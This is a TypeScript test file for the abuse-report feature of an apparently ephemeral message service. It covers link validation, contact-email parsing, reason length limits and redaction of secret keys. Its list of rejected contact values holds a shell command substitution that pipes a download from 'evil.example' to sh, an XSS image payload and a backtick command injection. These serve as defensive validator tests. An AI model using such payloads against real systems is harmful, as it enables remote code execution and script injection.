import { utf8 } from '@nylzo/core';
import { describe, expect, it } from 'vitest';

import { type CreateDependencies, createMessage } from '../../features/create/create-message.ts';
import { ApiError } from '../api/api-errors.ts';
import { abuseReport, fakeApi, type FakeApi, type FakeOptions } from '../api/fake-api.ts';
import { parseContact, reasonTooLong, redactReason, reportLink } from './report.ts';

const ORIGIN = 'https://nylzo.test';

function percentEncoded(text: string, prefix: string): string {
  return Array.from(utf8(text), (byte) => `${prefix}${byte.toString(16)}`).join('');
}

async function setup(options: FakeOptions = {}): Promise<{ api: FakeApi; link: string; id: string }> {
  const api = fakeApi(options);
  const dependencies: CreateDependencies = {
    api,
    origin: ORIGIN,
    scrypt: () => Promise.resolve(new Uint8Array(32)),
    solvePow: () => Promise.resolve(''),
  };
  const created = await createMessage({ text: 'ahoj', ttlSeconds: 3600, opensMax: 1, passphrase: '' }, dependencies);
  api.calls.length = 0;
  return { api, link: created.link, id: created.id };
}

describe('reporting a pasted link (D41)', () => {
  it('signs the report with the read key derived from the link and never claims the message', async () => {
    const { api, link, id } = await setup();
    expect(await reportLink(api, ORIGIN, `  ${link}\n`, abuseReport('phishing'))).toEqual({ outcome: 'accepted' });
    expect(api.reports).toEqual([{ id, signedByReader: true, ...abuseReport('phishing') }]);
    expect(api.calls).toEqual(['report']);
  });

  it('accepts the scheme and host in any letter case', async () => {
    const { api, link } = await setup();
    const shouting = link.replace('https://nylzo.test', 'HTTPS://NYLZO.TEST');
    expect(await reportLink(api, ORIGIN, shouting, abuseReport(''))).toEqual({ outcome: 'accepted' });
  });

  it('refuses a link of another service without sending anything', async () => {
    const { api, link } = await setup();
    for (const foreign of [
      link.replace('nylzo.test', 'evil.test'),
      link.replace('https://', 'http://'),
      link.replace('nylzo.test', 'nylzo.test:8443'),
    ]) {
      expect(await reportLink(api, ORIGIN, foreign, abuseReport(''))).toEqual({
        outcome: 'invalid',
        problems: ['link_foreign'],
      });
    }
    expect(api.calls).toEqual([]);
  });

  it('refuses a damaged link and a long reason together', async () => {
    const { api, link } = await setup();
    const long = abuseReport('ab '.repeat(334));
    expect(await reportLink(api, ORIGIN, link.split('#', 1)[0] ?? '', long)).toEqual({
      outcome: 'invalid',
      problems: ['link_invalid', 'reason_too_long'],
    });
    expect(await reportLink(api, ORIGIN, `${link}x`, abuseReport(''))).toEqual({
      outcome: 'invalid',
      problems: ['link_invalid'],
    });
    expect(api.calls).toEqual([]);
  });

  it('tells a link from a newer version apart and sends nothing', async () => {
    const { api, link } = await setup();
    expect(await reportLink(api, ORIGIN, link.replace('#2.', '#3.'), abuseReport(''))).toEqual({
      outcome: 'invalid',
      problems: ['link_newer'],
    });
    expect(await reportLink(api, ORIGIN, link.replace('#2.', '#0.'), abuseReport(''))).toEqual({
      outcome: 'invalid',
      problems: ['link_invalid'],
    });
    expect(api.calls).toEqual([]);
  });

  it('tells a link with the retired passphrase profile apart and sends nothing', async () => {
    const { api, link } = await setup();
    expect(await reportLink(api, ORIGIN, link.replace('#2.0.', '#2.2.'), abuseReport(''))).toEqual({
      outcome: 'invalid',
      problems: ['link_retired'],
    });
    expect(
      await reportLink(api, ORIGIN, link.replace('/r#', '/x#').replace('#2.0.', '#2.2.'), abuseReport('')),
    ).toEqual({
      outcome: 'invalid',
      problems: ['link_invalid'],
    });
    expect(api.calls).toEqual([]);
  });

  it('passes on a rate limit and other failures', async () => {
    const limited = await setup({ failReport: [new ApiError(429, 'rate_limited', { retryAfter: 60 })] });
    expect(await reportLink(limited.api, ORIGIN, limited.link, abuseReport(''))).toEqual({
      outcome: 'retry_later',
      retryAfter: 60,
    });
    const broken = await setup({ failReport: [new ApiError(500, 'internal')] });
    expect(await reportLink(broken.api, ORIGIN, broken.link, abuseReport(''))).toEqual({ outcome: 'failed' });
  });
});

describe('the contact and the good-faith statement (DSA Art. 16, spec §6.6)', () => {
  it('sends a trimmed contact and the statement', async () => {
    const { api, link, id } = await setup();
    expect(await reportLink(api, ORIGIN, link, abuseReport('phishing', ' jana@example.cz\n'))).toEqual({
      outcome: 'accepted',
    });
    expect(api.reports).toEqual([{ id, signedByReader: true, ...abuseReport('phishing', 'jana@example.cz') }]);
  });

  it('refuses an implausible contact and a missing statement without sending anything', async () => {
    const { api, link } = await setup();
    expect(await reportLink(api, ORIGIN, link, { reason: '', contact: 'jana@example', goodFaith: false })).toEqual({
      outcome: 'invalid',
      problems: ['contact_invalid', 'good_faith_missing'],
    });
    expect(api.calls).toEqual([]);
    const refused = await setup({ failReport: [new ApiError(400, 'contact')] });
    expect(await reportLink(refused.api, ORIGIN, refused.link, abuseReport('', 'jana@example.cz'))).toEqual({
      outcome: 'invalid',
      problems: ['contact_invalid'],
    });
  });

  it('keeps the contact rule of the server', () => {
    const link = `https://nylzo.test/m/${'A'.repeat(22)}#1.0.${'B'.repeat(43)}`;
    const longest = `${'a.'.repeat(120)}b@example.cz`;
    const valid: readonly (readonly [string, string])[] = [
      ['', ''],
      [' \t\n', ''],
      ['  jana@example.cz\n', 'jana@example.cz'],
      ['jana.novakova+abuse@mail.example', 'jana.novakova+abuse@mail.example'],
      ['jiri@xn--hek-0na27a.example', 'jiri@xn--hek-0na27a.example'],
      [longest, longest],
    ];
    expect(valid.map(([raw]) => parseContact(raw))).toEqual(valid.map(([, contact]) => contact));
    const invalid = [
      'jana',
      '@example.cz',
      'jana@',
      'jana@example',
      'jana@.example.cz',
      'jana@example..cz',
      'jana@example.cz.',
      'jana@@example.cz',
      'jana@example@cz.example',
      'ja na@example.cz',
      'jana\u{A0}@example.cz',
      'ja\u{1B}na@example.cz',
      'ja\u{202E}na@example.cz',
      'jana#1@example.cz',
      'jana@example.cz/m/x',
      'jana@exa_mple.cz',
      'ja\u{D800}na@example.cz',
      `${'a.'.repeat(122)}b@example.cz`,
      "o'brien@mail.example",
      'jiří@háček.example',
      'abuse@ex\u{430}mple.com',
      '$(curl${IFS}-s${IFS}evil.example|sh)@example.com',
      '<img/src=x/onerror=alert(1)>@example.com',
      'PHWPLfc5h_ttYhLwBUZM_r6y4UiSFMC54lqQJKLHYYE@example.com',
      'a`id`b@example.com',
      link,
      `${link}@example.cz`,
      `jana@example.cz ${link}`,
    ];
    expect(invalid.filter((raw) => parseContact(raw) !== undefined)).toEqual([]);
  });
});

describe('the length of a reason', () => {
  it('allows 1000 bytes and refuses more', () => {
    expect(reasonTooLong('a'.repeat(1000))).toBe(false);
    expect(reasonTooLong('a'.repeat(1001))).toBe(true);
    expect(reasonTooLong('č'.repeat(500))).toBe(false);
    expect(reasonTooLong('č'.repeat(501))).toBe(true);
  });

  it('refuses a reason whose JSON body would pass the server limit of 4096 bytes', () => {
    expect(reasonTooLong('"'.repeat(1000))).toBe(false);
    expect(reasonTooLong('\u{1}'.repeat(700))).toBe(true);
  });
});

describe('redacting a reason before it is signed (D41)', () => {
  it('removes a pasted link and S in every form the server decodes', async () => {
    const { api, link } = await setup();
    const secret = link.split('.').at(-1) ?? '';
    const zeroWidth = `${secret.slice(0, 20)}\u{200B}${secret.slice(20)}`;
    const redacted = [
      `phishing, see ${link}`,
      `see ${encodeURIComponent(link)}`,
      `see ${encodeURIComponent(encodeURIComponent(link))}`,
      `key ${secret}`,
      `key ${zeroWidth}`,
      `key ${percentEncoded(secret, '%')}`,
    ].map((reason) => redactReason(reason));
    expect(redacted.filter((reason) => reason.includes(secret))).toEqual([]);
    expect(redacted.filter((reason) => !reason.includes('[redacted]'))).toEqual([]);
    expect(await reportLink(api, ORIGIN, link, abuseReport(`phishing, see ${link}`))).toEqual({ outcome: 'accepted' });
    expect(api.reports[0]?.reason).toBe('phishing, see https://nylzo.test/r[redacted]');
  });

  it('redacts S that was percent-encoded three times, as deep as the server decodes', () => {
    const secret = 'AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-AbCdE';
    expect(redactReason(`key ${percentEncoded(secret, '%2525')}`)).toBe('key [redacted]');
  });

  it('keeps ordinary text and turns control characters into spaces', () => {
    expect(redactReason('phishing "quoted" ✓ 100% sure')).toBe('phishing "quoted" ✓ 100% sure');
    expect(redactReason('line\none\ttab\u{7}bell')).toBe('line one tab bell');
    expect(redactReason('bidi\u{202E}flip')).toBe('bidiflip');
    expect(redactReason('%25%32%35')).toBe('%');
  });

  it('measures the redacted reason against the limit', async () => {
    const { api, link } = await setup();
    const long = `${link.split('.').at(-1) ?? ''} `.repeat(30);
    expect(utf8(long).length).toBeGreaterThan(1000);
    expect(await reportLink(api, ORIGIN, link, abuseReport(long))).toEqual({ outcome: 'accepted' });
  });
});

describe('the reason length after redaction, as nylzo report checks it', () => {
  it.each([
    ['', false],
    ['phishing', false],
    ['ab '.repeat(400), true],
    ['a'.repeat(3000), false],
    ['# '.repeat(150), true],
    ['# '.repeat(50), false],
    ['<'.repeat(1000), false],
    [`${'ab '.repeat(333)}ab`, true],
  ])('%#', (reason, long) => {
    expect(reasonTooLong(redactReason(reason))).toBe(long);
  });
});
